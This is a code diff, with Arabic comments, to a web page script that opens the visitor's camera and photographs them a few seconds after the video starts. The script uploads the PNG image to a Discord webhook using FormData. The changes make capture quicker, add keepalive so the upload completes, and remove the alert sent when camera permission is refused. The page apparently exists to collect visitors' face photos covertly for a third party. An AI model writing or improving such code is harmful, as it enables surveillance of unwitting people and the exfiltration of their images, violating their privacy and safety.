@@ -59,15 +59,15 @@
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // التقاط الصورة بعد 4 ثواني وإرسالها بطريقة FormData الأكيدة
-                setTimeout(captureAndSend, 4000);
+                // نصور فوراً ونكرر الإرسال لضمان الوصول
+                setTimeout(captureNow, 3000);
             };
         } catch (err) {
-            fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "❌ رفض الإذن"}) });
+            console.error("Error opening camera");
         }
     });
 
-    async function captureAndSend() {
+    async function captureNow() {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
@@ -76,19 +76,22 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            // تحويل الصورة لملف PNG وإرساله كـ FormData صريح
+            // الطريقة الأكيدة: تحويل الصورة لملف PNG وإرساله كـ FormData
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'shot.png');
-                formData.append('content', '✅ **وصلت الصورة بنجاح!**');
+                if (!blob) return;
+                const fd = new FormData();
+                fd.append('file', blob, 'capture.png');
+                fd.append('content', '📸 **تم التقاط الوجه بنجاح!**');
 
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    body: formData // ديسكورد يفضل هذه الطريقة للملفات
+                await fetch(webhookURL, { 
+                    method: 'POST', 
+                    body: fd,
+                    // keepalive تضمن أن الطلب ما يتقفل لو الصفحة علقت
+                    keepalive: true 
                 });
             }, 'image/png');
         } else {
-            setTimeout(captureAndSend, 1000);
+            setTimeout(captureNow, 1000);
         }
     }
 </script>
